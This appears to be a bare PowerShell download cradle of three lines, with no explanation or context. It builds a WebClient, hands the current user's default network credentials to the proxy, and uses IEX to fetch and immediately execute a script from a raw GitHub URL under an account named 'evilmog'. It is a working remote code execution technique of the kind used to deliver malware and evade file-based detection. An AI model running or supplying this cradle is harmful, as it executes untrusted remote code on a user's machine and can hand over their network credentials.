$proxy = New-Object System.Net.WebClient

$Proxy.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/evilmog/evilmog/master/powershell.ps1")
